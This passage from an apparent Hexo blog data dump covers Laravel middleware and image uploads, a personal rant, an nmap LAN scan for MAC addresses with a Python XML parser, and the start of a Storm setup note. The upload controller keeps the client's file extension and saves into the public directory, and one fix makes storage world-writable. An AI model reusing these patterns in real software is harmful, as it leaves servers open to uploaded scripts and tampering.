class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// redirect</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(<span class=\"string\">'session2'</span>);</span><br><span class=\"line\"><span class=\"number\">9</span>&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Middleware\"><a href=\"#Middleware\" class=\"headerlink\" title=\"Middleware\"></a>Middleware</h2><p><strong>目的：实现一个功能，当访问时间小于活动开始时间，则跳转到宣传页面，当访问时间大于活动开始时间，则跳转到活动界面</strong><br><strong>1.宣传页面和活动页面构造</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app\\Http\\Controller\\StudentController.php</span></span><br><span class=\"line\">    <span class=\"comment\">// 宣传页面</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">activity0</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'活动快要开始啦，敬请关注'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 活动页面</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">activity1</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'活动进行中，谢谢您的参与1'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 活动页面</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">activity2</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'活动进行中，谢谢您的参与2'</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>2.添加Middleware</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app\\Http\\Middleware\\Activity.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Middleware</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Closure</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Activity</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">handle</span><span class=\"params\">($request, Closure $next)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (time() &lt; strtotime(<span class=\"string\">'2017-08-03'</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> redirect(<span class=\"string\">'activity0'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $next($request);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app\\Http\\Kernel.php 中添加一条Middleware</span></span><br><span class=\"line\"><span class=\"keyword\">protected</span> $routeMiddleware = [</span><br><span class=\"line\">        <span class=\"string\">'auth'</span> =&gt; \\Illuminate\\Auth\\Middleware\\Authenticate::class,</span><br><span class=\"line\">        <span class=\"string\">'auth.basic'</span> =&gt; \\Illuminate\\Auth\\Middleware\\AuthenticateWithBasicAuth::class,</span><br><span class=\"line\">        <span class=\"string\">'bindings'</span> =&gt; \\Illuminate\\Routing\\Middleware\\SubstituteBindings::class,</span><br><span class=\"line\">        <span class=\"string\">'can'</span> =&gt; \\Illuminate\\Auth\\Middleware\\Authorize::class,</span><br><span class=\"line\">        <span class=\"string\">'guest'</span> =&gt; \\App\\Http\\Middleware\\RedirectIfAuthenticated::class,</span><br><span class=\"line\">        <span class=\"string\">'throttle'</span> =&gt; \\Illuminate\\Routing\\Middleware\\ThrottleRequests::class,</span><br><span class=\"line\">        <span class=\"string\">'activity'</span> =&gt; \\App\\Http\\Middleware\\Activity::class,</span><br><span class=\"line\">    ];</span><br></pre></td></tr></table></figure>\n<p><strong>3.添加路由</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Route::group([<span class=\"string\">'middleware'</span> =&gt; [<span class=\"string\">'activity'</span>]], <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    Route::any(<span class=\"string\">'activity1'</span>, <span class=\"string\">'StudentController@activity1'</span>);</span><br><span class=\"line\">    Route::any(<span class=\"string\">'activity2'</span>, <span class=\"string\">'StudentController@activity2'</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">Route::any(<span class=\"string\">'activity0'</span>, <span class=\"string\">'StudentController@activity0'</span>);</span><br></pre></td></tr></table></figure></p>\n<p><strong>4.浏览器访问activity1或者activity2</strong></p>\n<h2 id=\"File\"><a href=\"#File\" class=\"headerlink\" title=\"File\"></a>File</h2><p><strong>项目中遇到一个问题，需要数据库储存图片，网上给出一个好的方式就是将图片的路径存进数据库，laravel中实现过程如下</strong><br><strong>1.提交图片表单</strong><br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form class=\"form-horizontal\" method=\"post\" enctype=\"multipart/form-data\" action=\"&#123;&#123; url('test2') &#125;&#125;\"&gt;</span><br><span class=\"line\">    &#123;&#123; csrf_field() &#125;&#125;</span><br><span class=\"line\">&lt;input type=\"file\" name=\"photo\"&gt;</span><br><span class=\"line\">&lt;div class=\"form-group\"&gt;</span><br><span class=\"line\">    &lt;div class=\"col-sm-offset-2 col-sm-10\"&gt;</span><br><span class=\"line\">        &lt;button type=\"submit\" class=\"btn btn-primary\"&gt;提交&lt;/button&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>\n<p><strong>2.显示图片页面</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img height=<span class=\"string\">\"150\"</span> width=<span class=\"string\">\"150px\"</span> src=<span class=\"string\">\"&#123;&#123;url('/images/'.$image)&#125;&#125;\"</span>/&gt;</span><br></pre></td></tr></table></figure></p>\n<p><strong>3.控制器实现</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test2</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $img = time() . <span class=\"string\">'.'</span> . $request-&gt;photo-&gt;getClientOriginalExtension();</span><br><span class=\"line\">    $path = $request-&gt;photo-&gt;move(public_path(<span class=\"string\">'images'</span>),$img);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> view(<span class=\"string\">'student.test2'</span>, [</span><br><span class=\"line\">        <span class=\"string\">'image'</span> =&gt; $img,</span><br><span class=\"line\">    ]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>最后图片存进了laravel项目下的public/images</strong></p>\n<h2 id=\"踩坑总结\"><a href=\"#踩坑总结\" class=\"headerlink\" title=\"踩坑总结\"></a>踩坑总结</h2><ol>\n<li><code>TokenMismatchException in VerifyCsrfToken.php line 68</code><br><strong>laravel 默认开启了 csrf验证 ，post请求需要验证csrf,所以要在表单里 加个隐藏域</strong><br><strong>解决方案：</strong><br><img src=\"/images/laravel_problem_1.png\" alt=\"\"></li>\n<li><p><code>MassAssignmentException in Model.php line 232:</code><br><strong>在添加学生的时候选择<code>action</code>为空时，会出现这个错误，解释为<code>new Student</code>时复制不能批量操作，因此要在<code>Model</code>中添加</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> $fillable = [<span class=\"string\">'name'</span>, <span class=\"string\">'age'</span>, <span class=\"string\">'sex'</span>];</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>ErrorException in HasAttributes.php line 403:\nRelationship method must return an object of type Illuminate\\Database\\Eloquent\\Relations\\Relation</code><br><strong>在写<code>Student</code>模型的时候，将一个方法命名为<code>sex</code>，但<code>Student</code>又有一个属性是<code>sex</code>，两者相冲突了，因此需要将<code>sex</code>方法重新命名以解决冲突</strong></p>\n</li>\n<li><code>无法修改和删除数据</code><br><strong>这是我遇到的巨坑的一次，原因在于<code>Student Model</code>中将主码写错了，原本应该是<code>id</code>，被我写成了<code>ID</code>，然后一直被找出来，之前就有预感是<code>Student Model</code>错了，但是我检查了很多遍都没注意，吐血。。。</strong></li>\n<li><p><code>PDOException in Connector.php line 55:could not find driver</code><br><strong>就像报错说的没有找到<code>driver(驱动)</code>，所以少了什么呢，少了<code>php</code>连接<code>mysql</code>的<code>module(组件)</code>，组件名字<code>pdo_mysql</code>，安装组件后重启<code>php-fpm</code>和<code>nginx</code></strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install php70w-mysql</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>Laravel sessions not working on server</code><br><strong>这个问题困扰我两天吧，然后先说遇到的问题，就是在浏览器中修改数据或者添加数据等操作后，应该在页面有一个提示消息，我单独分离出来用<code>Session</code>实现，在<code>php</code>内带服务器上可以正常工作，但是在我的<code>server</code>中却无法实现。解决方法是修改文件<code>model</code></strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod -R a+rw storage/</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>ErrorException in e4e354417ec7f106982a7198b9ad5688b9936b71.php line 1:\nUndefined variable: errors</code><br><strong>这个跟中间件有关系，主要实在5.2版本中会遇到，解决方案是将<code>Kernel.php</code>中的<code>$middlewareGroups</code>的内容移到<code>$middleware</code>中</strong></p>\n</li>\n<li><code>No supported encrypter found. The cipher and / or key length are invalid.</code><br><strong>执行<code>php artisan key:generate</code>就 ok</strong></li>\n</ol>\n<h2 id=\"项目源码\"><a href=\"#项目源码\" class=\"headerlink\" title=\"项目源码\"></a>项目源码</h2><p><a href=\"https://github.com/fenlan/laravel-ubuntu\">laravel-ubuntu</a></p>"},{"title":"发个牢骚","comments":1,"date":"2016-05-22T08:18:23.000Z","_content":"今天不知道一不小心把那个代码改了，直接导致每篇博文下面的comment前面的图标不见了。室友说这点小细节不要在意，然而对于我这种患强迫症的人来说就是烦，想着去改，结果没改好，导致我的留言板也没做好。所以今天整个人都不好了。。。。最后决定以补补高数算了，晚上慢慢再找找这个小bug.","source":"_posts/my-note2.md","raw":"---\ntitle: 发个牢骚\ncomments: true\ndate: 2016-05-22 16:18:23\n---\n今天不知道一不小心把那个代码改了，直接导致每篇博文下面的comment前面的图标不见了。室友说这点小细节不要在意，然而对于我这种患强迫症的人来说就是烦，想着去改，结果没改好，导致我的留言板也没做好。所以今天整个人都不好了。。。。最后决定以补补高数算了，晚上慢慢再找找这个小bug.","slug":"my-note2","published":1,"updated":"2017-11-21T09:17:19.637Z","layout":"post","photos":[],"link":"","_id":"cjgrjsczm002lyp0l8m73nk8f","content":"<p>今天不知道一不小心把那个代码改了，直接导致每篇博文下面的comment前面的图标不见了。室友说这点小细节不要在意，然而对于我这种患强迫症的人来说就是烦，想着去改，结果没改好，导致我的留言板也没做好。所以今天整个人都不好了。。。。最后决定以补补高数算了，晚上慢慢再找找这个小bug.</p>\n","excerpt":"","more":"<p>今天不知道一不小心把那个代码改了，直接导致每篇博文下面的comment前面的图标不见了。室友说这点小细节不要在意，然而对于我这种患强迫症的人来说就是烦，想着去改，结果没改好，导致我的留言板也没做好。所以今天整个人都不好了。。。。最后决定以补补高数算了，晚上慢慢再找找这个小bug.</p>\n"},{"title":"获取局域网连接设备mac地址","date":"2017-03-22T07:18:23.000Z","_content":"\n# 使用工具\n**nmap: 也就是Network Mapper,最早是linux下的网络扫描和嗅探工具包**\n**nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络端口。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统。他是网络管理员比用的软件之一，以及用以评估网络系统安全。 **\n<!--more-->\n# 步骤\n### 1.通过nmap扫描出连接同一局域网的设备的ip 地址以及 mac 地址，扫描完成再以xml 文件形式储存起来。具体命令如下：\n``` bash\n# nmap -sP -oX myscan.xml 192.168.1.0/24\n```\n**需要注意的问题： 如果要获取mac 地址，需要操作系统的管理者权限，对于Linux来说就是root 权限；另外，由于是通过发包探测，如果遇上有防火墙的路由器，会比较麻烦。**\n**缺点： 在扫描设备多的情况下，时间会偏长，亲试最长时间21秒，这根被扫描设备的状态有关。**\n\n### 2.使用python 获取xml 文件中的mac 地址存入指定文件：\n``` python\n# readxml.py\nfrom xml.dom import minidom\n\nf = open(\"maclist.txt\", 'wb')   # 存入mac 地址的目标文件\nxmldoc = minidom.parse('myscan.xml')    # 获取 nmap 导出的 xml 文件\n\naddrlist = xmldoc.getElementsByTagName('address')\nlen = (len(addrlist)-1) / 2  # 计算连接设备数量\n# 在addrlist 中有 IP 地址 和 mac 地址，因此要减半\n\nprint \"len :\", len\nf.write(str(len))\nf.write(\"\\n\")\nfor s in addrlist :\n\tif s.attributes['addrtype'].value == \"mac\" :\n    \tf.write(s.attributes['addr'].value)\n        f.write(\"\\n\")\n        \nf.close()\n```\n\n### 3.将两个命令写在一个脚本里面：\n``` bash\n#!/bin/bash\n\nnmap -sP -oX myscan.xml 192.168.1.0/24\npython readxml.py\n```\n\n### 4.运行脚本搞定","source":"_posts/nmap_mac.md","raw":"---\ntitle: 获取局域网连接设备mac地址\ndate: 2017-03-22 15:18:23\ncategories: linux\ntags:\n  - nmap\n  - python\n---\n\n# 使用工具\n**nmap: 也就是Network Mapper,最早是linux下的网络扫描和嗅探工具包**\n**nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络端口。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统。他是网络管理员比用的软件之一，以及用以评估网络系统安全。 **\n<!--more-->\n# 步骤\n### 1.通过nmap扫描出连接同一局域网的设备的ip 地址以及 mac 地址，扫描完成再以xml 文件形式储存起来。具体命令如下：\n``` bash\n# nmap -sP -oX myscan.xml 192.168.1.0/24\n```\n**需要注意的问题： 如果要获取mac 地址，需要操作系统的管理者权限，对于Linux来说就是root 权限；另外，由于是通过发包探测，如果遇上有防火墙的路由器，会比较麻烦。**\n**缺点： 在扫描设备多的情况下，时间会偏长，亲试最长时间21秒，这根被扫描设备的状态有关。**\n\n### 2.使用python 获取xml 文件中的mac 地址存入指定文件：\n``` python\n# readxml.py\nfrom xml.dom import minidom\n\nf = open(\"maclist.txt\", 'wb')   # 存入mac 地址的目标文件\nxmldoc = minidom.parse('myscan.xml')    # 获取 nmap 导出的 xml 文件\n\naddrlist = xmldoc.getElementsByTagName('address')\nlen = (len(addrlist)-1) / 2  # 计算连接设备数量\n# 在addrlist 中有 IP 地址 和 mac 地址，因此要减半\n\nprint \"len :\", len\nf.write(str(len))\nf.write(\"\\n\")\nfor s in addrlist :\n\tif s.attributes['addrtype'].value == \"mac\" :\n    \tf.write(s.attributes['addr'].value)\n        f.write(\"\\n\")\n        \nf.close()\n```\n\n### 3.将两个命令写在一个脚本里面：\n``` bash\n#!/bin/bash\n\nnmap -sP -oX myscan.xml 192.168.1.0/24\npython readxml.py\n```\n\n### 4.运行脚本搞定","slug":"nmap_mac","published":1,"updated":"2017-11-28T03:28:23.185Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsczo002pyp0lkzn1n3h6","content":"<h1 id=\"使用工具\"><a href=\"#使用工具\" class=\"headerlink\" title=\"使用工具\"></a>使用工具</h1><p><strong>nmap: 也就是Network Mapper,最早是linux下的网络扫描和嗅探工具包</strong><br><strong>nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络端口。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统。他是网络管理员比用的软件之一，以及用以评估网络系统安全。 </strong><br><a id=\"more\"></a></p>\n<h1 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h1><h3 id=\"1-通过nmap扫描出连接同一局域网的设备的ip-地址以及-mac-地址，扫描完成再以xml-文件形式储存起来。具体命令如下：\"><a href=\"#1-通过nmap扫描出连接同一局域网的设备的ip-地址以及-mac-地址，扫描完成再以xml-文件形式储存起来。具体命令如下：\" class=\"headerlink\" title=\"1.通过nmap扫描出连接同一局域网的设备的ip 地址以及 mac 地址，扫描完成再以xml 文件形式储存起来。具体命令如下：\"></a>1.通过nmap扫描出连接同一局域网的设备的ip 地址以及 mac 地址，扫描完成再以xml 文件形式储存起来。具体命令如下：</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># nmap -sP -oX myscan.xml 192.168.1.0/24</span></span><br></pre></td></tr></table></figure>\n<p><strong>需要注意的问题： 如果要获取mac 地址，需要操作系统的管理者权限，对于Linux来说就是root 权限；另外，由于是通过发包探测，如果遇上有防火墙的路由器，会比较麻烦。</strong><br><strong>缺点： 在扫描设备多的情况下，时间会偏长，亲试最长时间21秒，这根被扫描设备的状态有关。</strong></p>\n<h3 id=\"2-使用python-获取xml-文件中的mac-地址存入指定文件：\"><a href=\"#2-使用python-获取xml-文件中的mac-地址存入指定文件：\" class=\"headerlink\" title=\"2.使用python 获取xml 文件中的mac 地址存入指定文件：\"></a>2.使用python 获取xml 文件中的mac 地址存入指定文件：</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># readxml.py</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> xml.dom <span class=\"keyword\">import</span> minidom</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(<span class=\"string\">\"maclist.txt\"</span>, <span class=\"string\">'wb'</span>)   <span class=\"comment\"># 存入mac 地址的目标文件</span></span><br><span class=\"line\">xmldoc = minidom.parse(<span class=\"string\">'myscan.xml'</span>)    <span class=\"comment\"># 获取 nmap 导出的 xml 文件</span></span><br><span class=\"line\"></span><br><span class=\"line\">addrlist = xmldoc.getElementsByTagName(<span class=\"string\">'address'</span>)</span><br><span class=\"line\">len = (len(addrlist)<span class=\"number\">-1</span>) / <span class=\"number\">2</span>  <span class=\"comment\"># 计算连接设备数量</span></span><br><span class=\"line\"><span class=\"comment\"># 在addrlist 中有 IP 地址 和 mac 地址，因此要减半</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"len :\"</span>, len</span><br><span class=\"line\">f.write(str(len))</span><br><span class=\"line\">f.write(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> addrlist :</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> s.attributes[<span class=\"string\">'addrtype'</span>].value == <span class=\"string\">\"mac\"</span> :</span><br><span class=\"line\">    \tf.write(s.attributes[<span class=\"string\">'addr'</span>].value)</span><br><span class=\"line\">        f.write(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">f.close()</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-将两个命令写在一个脚本里面：\"><a href=\"#3-将两个命令写在一个脚本里面：\" class=\"headerlink\" title=\"3.将两个命令写在一个脚本里面：\"></a>3.将两个命令写在一个脚本里面：</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span><br><span class=\"line\"></span></span><br><span class=\"line\">nmap <span class=\"_\">-s</span>P -oX myscan.xml 192.168.1.0/24</span><br><span class=\"line\">python readxml.py</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-运行脚本搞定\"><a href=\"#4-运行脚本搞定\" class=\"headerlink\" title=\"4.运行脚本搞定\"></a>4.运行脚本搞定</h3>","excerpt":"<h1 id=\"使用工具\"><a href=\"#使用工具\" class=\"headerlink\" title=\"使用工具\"></a>使用工具</h1><p><strong>nmap: 也就是Network Mapper,最早是linux下的网络扫描和嗅探工具包</strong><br><strong>nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络端口。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统。他是网络管理员比用的软件之一，以及用以评估网络系统安全。 </strong><br>","more":"</p>\n<h1 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h1><h3 id=\"1-通过nmap扫描出连接同一局域网的设备的ip-地址以及-mac-地址，扫描完成再以xml-文件形式储存起来。具体命令如下：\"><a href=\"#1-通过nmap扫描出连接同一局域网的设备的ip-地址以及-mac-地址，扫描完成再以xml-文件形式储存起来。具体命令如下：\" class=\"headerlink\" title=\"1.通过nmap扫描出连接同一局域网的设备的ip 地址以及 mac 地址，扫描完成再以xml 文件形式储存起来。具体命令如下：\"></a>1.通过nmap扫描出连接同一局域网的设备的ip 地址以及 mac 地址，扫描完成再以xml 文件形式储存起来。具体命令如下：</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># nmap -sP -oX myscan.xml 192.168.1.0/24</span></span><br></pre></td></tr></table></figure>\n<p><strong>需要注意的问题： 如果要获取mac 地址，需要操作系统的管理者权限，对于Linux来说就是root 权限；另外，由于是通过发包探测，如果遇上有防火墙的路由器，会比较麻烦。</strong><br><strong>缺点： 在扫描设备多的情况下，时间会偏长，亲试最长时间21秒，这根被扫描设备的状态有关。</strong></p>\n<h3 id=\"2-使用python-获取xml-文件中的mac-地址存入指定文件：\"><a href=\"#2-使用python-获取xml-文件中的mac-地址存入指定文件：\" class=\"headerlink\" title=\"2.使用python 获取xml 文件中的mac 地址存入指定文件：\"></a>2.使用python 获取xml 文件中的mac 地址存入指定文件：</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># readxml.py</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> xml.dom <span class=\"keyword\">import</span> minidom</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(<span class=\"string\">\"maclist.txt\"</span>, <span class=\"string\">'wb'</span>)   <span class=\"comment\"># 存入mac 地址的目标文件</span></span><br><span class=\"line\">xmldoc = minidom.parse(<span class=\"string\">'myscan.xml'</span>)    <span class=\"comment\"># 获取 nmap 导出的 xml 文件</span></span><br><span class=\"line\"></span><br><span class=\"line\">addrlist = xmldoc.getElementsByTagName(<span class=\"string\">'address'</span>)</span><br><span class=\"line\">len = (len(addrlist)<span class=\"number\">-1</span>) / <span class=\"number\">2</span>  <span class=\"comment\"># 计算连接设备数量</span></span><br><span class=\"line\"><span class=\"comment\"># 在addrlist 中有 IP 地址 和 mac 地址，因此要减半</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"len :\"</span>, len</span><br><span class=\"line\">f.write(str(len))</span><br><span class=\"line\">f.write(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> addrlist :</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> s.attributes[<span class=\"string\">'addrtype'</span>].value == <span class=\"string\">\"mac\"</span> :</span><br><span class=\"line\">    \tf.write(s.attributes[<span class=\"string\">'addr'</span>].value)</span><br><span class=\"line\">        f.write(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">f.close()</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-将两个命令写在一个脚本里面：\"><a href=\"#3-将两个命令写在一个脚本里面：\" class=\"headerlink\" title=\"3.将两个命令写在一个脚本里面：\"></a>3.将两个命令写在一个脚本里面：</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span><br><span class=\"line\"></span></span><br><span class=\"line\">nmap <span class=\"_\">-s</span>P -oX myscan.xml 192.168.1.0/24</span><br><span class=\"line\">python readxml.py</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-运行脚本搞定\"><a href=\"#4-运行脚本搞定\" class=\"headerlink\" title=\"4.运行脚本搞定\"></a>4.运行脚本搞定</h3>"},{"title":"Storm","date":"2018-01-31T07:18:23.000Z","_content":"\n## 安装zookeeper\n> 安装过程查看文章[http://fenlan.github.io/2017/11/29/zookeeper-kafka/](http://fenlan.github.io/2017/11/29/zookeeper-kafka/)\n\n## 安装Storm\n1. 官网下载Storm\n2. 配置`storm/conf/storm.yaml`\n\n``` bash\n storm.zookeeper.servers:\n     - \"zookeeper-server1\"\n     - 